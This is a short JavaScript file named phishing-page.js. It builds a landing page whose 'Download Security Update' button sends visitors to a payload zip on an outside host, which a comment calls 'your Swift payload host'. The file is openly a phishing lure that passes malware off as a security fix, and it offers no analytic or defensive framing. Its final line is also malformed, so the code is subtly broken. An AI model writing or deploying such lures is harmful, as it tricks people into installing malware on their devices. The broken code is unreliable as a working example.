// phishing-page.js
const malwareURL = 'https://viztrrx.onion.tools/payload.zip'; // your Swift payload host

// Create a download link
const downloadLink = '/download-malware';

// Simple landing page
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.createElement('button');
    btn.textContent = 'Download Security Update';
    btn.style = 'background: #00ff00; color: white; padding: 20px; font-size: 18px;';
    btn.onclick = () => window.location.href = malwareURL;
    document.body.appendChild(btn);
};
